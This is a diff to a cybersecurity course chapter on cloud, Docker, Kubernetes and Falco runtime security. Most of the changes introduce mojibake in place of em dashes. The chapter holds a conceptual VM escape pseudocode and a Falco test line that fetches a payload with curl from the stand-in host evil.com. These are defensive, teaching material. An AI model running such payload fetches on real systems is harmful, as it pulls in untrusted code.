@@ -6,8 +6,8 @@ permalink: /cyber-security/07-cloud-mobile/
 
 # Chapter 7: Cloud & Mobile Security
 
-> **Prereq:** Chapter 6 (IAM) — cloud security extends IAM to cloud provider and mobile device identities.
-> **Next:** Chapter 8 (Forensics & IR) — incident response in cloud and mobile environments requires specialised processes.
+> **Prereq:** Chapter 6 (IAM) â€” cloud security extends IAM to cloud provider and mobile device identities.
+> **Next:** Chapter 8 (Forensics & IR) â€” incident response in cloud and mobile environments requires specialised processes.
 
 ---
 
@@ -58,37 +58,37 @@ flowchart LR
 ## Cloud Service Models
 
 ### 1. Infrastructure as a Service (IaaS)
-**Analogy:** Renting an apartment — the landlord provides the building shell and plumbing (hypervisor, hardware, network). You bring your own furniture, paint the walls, and fix your leaky faucet (OS, middleware, apps, data).
+**Analogy:** Renting an apartment â€” the landlord provides the building shell and plumbing (hypervisor, hardware, network). You bring your own furniture, paint the walls, and fix your leaky faucet (OS, middleware, apps, data).
 
 **What YOU secure:** Applications, data, runtime, OS, middleware, network config (security groups, ACLs).
 **What provider secures:** Physical datacenter, hardware, storage, networking, hypervisor.
 
-**Example — AWS EC2:**
+**Example â€” AWS EC2:**
 ```bash
-# IaaS — you manage the AMI, OS patches, firewall rules
+# IaaS â€” you manage the AMI, OS patches, firewall rules
 aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.large --security-group-ids sg-12345
 aws ec2 create-security-group --group-name web-sg --description "Web tier security group"
 aws ec2 authorize-security-group-ingress --group-name web-sg --protocol tcp --port 443 --cidr 0.0.0.0/0
 ```
 
 ### 2. Platform as a Service (PaaS)
-**Analogy:** Renting a fully furnished apartment — the landlord provides furniture, appliances, and utilities. You just bring your clothes and cook your food (your application code and data).
+**Analogy:** Renting a fully furnished apartment â€” the landlord provides furniture, appliances, and utilities. You just bring your clothes and cook your food (your application code and data).
 
 **What YOU secure:** Application code, data, access configuration (IAM, secrets).
 **What provider secures:** Runtime, middleware, OS, hypervisor, hardware, networking.
 
-**Example — AWS Elastic Beanstalk:**
+**Example â€” AWS Elastic Beanstalk:**
 ```bash
-# PaaS — provider handles OS, runtime, web server
+# PaaS â€” provider handles OS, runtime, web server
 aws elasticbeanstalk create-application --application-name my-app
 aws elasticbeanstalk create-environment --application-name my-app --environment-name prod --solution-stack-name "64bit Amazon Linux 2 v5.8.4 running Node.js 18"
 ```
 
 ### 3. Software as a Service (SaaS)
-**Analogy:** Staying at a hotel — everything is provided. You just use the service. You're responsible for keeping your room locked (your data, user accounts, access policies).
+**Analogy:** Staying at a hotel â€” everything is provided. You just use the service. You're responsible for keeping your room locked (your data, user accounts, access policies).
 
 **What YOU secure:** Data classification, user access management (IAM), client-side security.
-**What provider secures:** Everything below data — application, runtime, OS, middleware, hardware, networking.
+**What provider secures:** Everything below data â€” application, runtime, OS, middleware, hardware, networking.
 
 ### Responsibility Comparison Table
 
@@ -104,7 +104,7 @@ aws elasticbeanstalk create-environment --application-name my-app --environment-
 | Networking | Customer | Provider | Provider | Provider |
 | Physical Security | Customer | Provider | Provider | Provider |
 
-**Dry Run — Responsibility Decision Flow:**
+**Dry Run â€” Responsibility Decision Flow:**
 ```
 Input: App deployment scenario (Web app on AWS)
 1. Is it bare metal? ? On-prem (you own everything)
@@ -114,11 +114,11 @@ Input: App deployment scenario (Web app on AWS)
 5. Is it WorkDocs? ? SaaS (provider secures everything, you control access)
 Output: Responsibility assignment matrix
 
-Complexity: O(1) — direct classification
+Complexity: O(1) â€” direct classification
 ```
 
 ### Edge Cases
-- **Container services (EKS, AKS, GKE):** Hybrid model — provider secures control plane, customer secures worker nodes, pods, and container runtime. Responsibility boundary is at the Kubernetes API server.
+- **Container services (EKS, AKS, GKE):** Hybrid model â€” provider secures control plane, customer secures worker nodes, pods, and container runtime. Responsibility boundary is at the Kubernetes API server.
 - **Serverless (Lambda, Functions):** Provider secures execution environment, customer secures function code, dependencies, and IAM permissions. Cold-start containers are provider-managed.
 - **Shared VPC (GCP Hosted Projects):** Host project owner secures networking, service project owner secures resources. Split responsibility model.
 
@@ -126,7 +126,7 @@ Complexity: O(1) — direct classification
 
 ## Cloud Shared Responsibility Model
 
-### Deep Dive — The Six Layers of Cloud Security
+### Deep Dive â€” The Six Layers of Cloud Security
 
 ```
 Layer 1: Physical Security (CSP only)
@@ -161,7 +161,7 @@ Layer 6: Governance & Compliance (shared)
 
 **Real-World Analogy:** A bank safety deposit box. The bank secures the vault, the building, and the guards (Security *of* the Cloud). You secure your key and what you put in the box (Security *in* the Cloud). If you leave your box unlocked, the bank isn't responsible.
 
-**Numbered Steps — Determining Responsibility:**
+**Numbered Steps â€” Determining Responsibility:**
 1. Identify the service model (IaaS/PaaS/SaaS) from the deployment type.
 2. Consult the provider's Shared Responsibility Matrix (SRM) document.
 3. For each resource category (compute, storage, network, data, identity), check who has configuration access.
@@ -170,7 +170,7 @@ Layer 6: Governance & Compliance (shared)
 6. Automate compliance checks using CSPM tools (AWS Config, Azure Policy, GCP CSPM).
 7. Re-assess when migrating between service models or adding new services.
 
-**A&D Table — Shared Responsibility Model:**
+**A&D Table â€” Shared Responsibility Model:**
 
 | Aspect | Advantages | Disadvantages |
 |--------|-----------|---------------|
@@ -182,7 +182,7 @@ Layer 6: Governance & Compliance (shared)
 
 **Edge Cases:**
 - **AWS Fargate:** Provider manages the runtime and OS; customer manages task definitions, IAM roles, and container images. The boundary is at the container runtime level.
-- **GCP Cloud Run:** Fully managed Knative — provider patches underlying K8s, customer secures service account permissions and container images.
+- **GCP Cloud Run:** Fully managed Knative â€” provider patches underlying K8s, customer secures service account permissions and container images.
 - **Azure AD B2C:** Provider secures the identity platform; customer configures user flows, attribute collection, and API connectors. Shared responsibility for user data.
 
 ---
@@ -203,7 +203,7 @@ Layer 6: Governance & Compliance (shared)
 | Side-Channel | Guest observes host or other guests via shared resources | Spectre/Meltdown (cross-VM cache leaks) |
 | VM Hopping | Guest accesses another guest via shared memory | Memory deduplication attacks |
 
-### VM Escape — Detailed Walkthrough
+### VM Escape â€” Detailed Walkthrough
 
 **Step-by-Step Attack Flow:**
 1. Attacker gains code execution inside a guest VM (e.g., via web app RCE).
@@ -213,9 +213,9 @@ Layer 6: Governance & Compliance (shared)
 5. Attacker gains arbitrary code execution on the host OS.
 6. Attacker accesses other VMs on the same host or the hypervisor control layer.
 
-**Pseudocode — VM Escape Exploit Concept:**
+**Pseudocode â€” VM Escape Exploit Concept:**
 ```
-// Concept — DO NOT USE MALICIOUSLY
+// Concept â€” DO NOT USE MALICIOUSLY
 function attemptVmEscape():
     # Step 1: Detect hypervisor
     if cpuid(hypervisor_present) == true:
@@ -233,7 +233,7 @@ function attemptVmEscape():
 ```
 
 **Complexity Analysis:**
-- **Detection phase:** O(1) — single CPUID instruction
+- **Detection phase:** O(1) â€” single CPUID instruction
 - **Vulnerability probing:** O(n) where n = number of known CVEs
 - **Exploit execution:** Depends on exploit complexity
 - **Memory access after escape:** O(1) once kernel access gained
@@ -249,11 +249,11 @@ function attemptVmEscape():
 | Ghost VMs (unauthorized) | Hidden attack surface | Cloud inventory scanning (AWS Config) |
 
 **Edge Cases:**
-- **Nested virtualization:** Running a hypervisor inside a VM (common for training, containers-on-VM). Additional isolation concerns — can be exploited for hyperjacking.
+- **Nested virtualization:** Running a hypervisor inside a VM (common for training, containers-on-VM). Additional isolation concerns â€” can be exploited for hyperjacking.
 - **Hardware pass-through (PCIe, GPU):** Direct device assignment bypasses hypervisor mediation. Malicious DMA attacks possible without IOMMU.
-- **Memory ballooning:** Hypervisor reclaims guest memory — potential information leak if memory isn't zeroed before reassignment.
+- **Memory ballooning:** Hypervisor reclaims guest memory â€” potential information leak if memory isn't zeroed before reassignment.
 
-### A&D Table — Virtualization Security
+### A&D Table â€” Virtualization Security
 
 | Aspect | Advantages | Disadvantages |
 |--------|-----------|---------------|
@@ -317,10 +317,10 @@ docker run --pid=host --net=host --cap-add=audit_control \
 # [FAIL] 5.4 - Ensure privileged containers are not used
 ```
 
-**Complexity Analysis — Docker Security:**
+**Complexity Analysis â€” Docker Security:**
 - **docker-bench-security scan:** O(n) where n = number of test checks (~100 checks)
 - **Image vulnerability scan (Trivy):** O(p + v) where p = packages, v = vulnerability DB entries
-- **seccomp profile filtering:** O(1) per syscall — kernel overhead at syscall boundary
+- **seccomp profile filtering:** O(1) per syscall â€” kernel overhead at syscall boundary
 
 ### Trivy Container Image Scanning
 
@@ -342,7 +342,7 @@ trivy filesystem --severity HIGH /path/to/container/rootfs
 trivy k8s cluster --severity CRITICAL
 ```
 
-**Dry Run — Trivy Scan Output Interpretation:**
+**Dry Run â€” Trivy Scan Output Interpretation:**
 ```
 Input: trivy image nginx:1.21.6
 Scan starts ?
@@ -355,7 +355,7 @@ Scan starts ?
 Output: 2 CRITICAL, 1 HIGH vulnerability found
 ```
 
-### Docker Security — Edge Cases
+### Docker Security â€” Edge Cases
 
 - **Rootless Docker (dockerd-rootless):** Docker daemon runs without root privileges. Prevents daemon compromise from escalating to host root. Requires cgroup v2 and specific configuration.
 - **User namespace remapping:** Maps container root (UID 0) to a non-privileged host UID. Effective against container escape via UID 0 exploitation.
@@ -366,7 +366,7 @@ Output: 2 CRITICAL, 1 HIGH vulnerability found
 
 ## Kubernetes Security
 
-**Analogy:** A naval fleet. The control plane (API server, etcd) is the command ship. Each worker node is a warship. Pods are crew squads. RBAC policies are security clearances. Network policies are radio frequencies — only authorized units can communicate. Secrets are classified documents locked in the captain's safe.
+**Analogy:** A naval fleet. The control plane (API server, etcd) is the command ship. Each worker node is a warship. Pods are crew squads. RBAC policies are security clearances. Network policies are radio frequencies â€” only authorized units can communicate. Secrets are classified documents locked in the captain's safe.
 
 ### Kubernetes Attack Surface
 
@@ -383,7 +383,7 @@ Output: 2 CRITICAL, 1 HIGH vulnerability found
 
 ### RBAC (Role-Based Access Control)
 
-**Pseudocode — RBAC Configuration Pattern:**
+**Pseudocode â€” RBAC Configuration Pattern:**
 ```
 Principle: Least privilege for every identity
 Entities: User, Group, ServiceAccount
@@ -443,7 +443,7 @@ kubectl run nginx --image=nginx  # Should be blocked if restricted
 #   - seccompProfile not set to RuntimeDefault or Localhost
 ```
 
-**Dry Run — Pod Admission with PSS:**
+**Dry Run â€” Pod Admission with PSS:**
 ```
 Input: Pod spec requesting privileged=true, hostPID=true
 1. API server receives Pod creation request
@@ -492,8 +492,8 @@ kubectl run test --image=alpine --rm -it -- wget -qO- http://backend-svc.product
 # Expected: connection timeout (blocked by network policy)
 ```
 
-**Complexity Analysis — Network Policies:**
-- **Policy creation:** O(1) — declarative YAML
+**Complexity Analysis â€” Network Policies:**
+- **Policy creation:** O(1) â€” declarative YAML
 - **Apply to cluster:** O(n) where n = number of pods affected
 - **Packet filtering overhead:** O(p) per packet where p = number of matching policies
 - **Convergence time:** Seconds (iptables rules updated on each node)
@@ -597,7 +597,7 @@ kubectl run kube-bench --image=aquasec/kube-bench:latest --restart=Never -- node
 
 ### Falco Runtime Security
 
-**Analogy:** A security guard watching every door, window, and hallway in real-time. Falco monitors system calls from the kernel and alerts on suspicious behavior — like someone trying to open the server room door at 3 AM.
+**Analogy:** A security guard watching every door, window, and hallway in real-time. Falco monitors system calls from the kernel and alerts on suspicious behavior â€” like someone trying to open the server room door at 3 AM.
 
 **Falco Rule Structure:**
 ```yaml
@@ -652,17 +652,17 @@ docker run --rm -it alpine sh -c "apk add curl && curl http://evil.com/payload"
 # (user=root container_id=abc123 image=alpine shell=sh pid=42)
 ```
 
-**Complexity Analysis — Falco:**
-- **Syscall monitoring:** O(1) per syscall — kernel-level event notification
+**Complexity Analysis â€” Falco:**
+- **Syscall monitoring:** O(1) per syscall â€” kernel-level event notification
 - **Rule evaluation:** O(n) where n = number of rules per event
 - **Performance overhead:** 1-3% CPU on typical workloads
 - **Alert throughput:** Hundreds of thousands of events per second
 
-### A&D Table — Container Security
+### A&D Table â€” Container Security
 
 | Aspect | Advantages | Disadvantages |
 |--------|-----------|---------------|
-| Isolation | Lightweight vs VMs | Shared kernel — less isolation |
+| Isolation | Lightweight vs VMs | Shared kernel â€” less isolation |
 | Image scanning | Catch CVEs pre-deployment | False positives, stale DB |
 | RBAC | Fine-grained access control | Complex to manage at scale |
 | Network policies | Micro-segmentation | Overhead on pod startup |
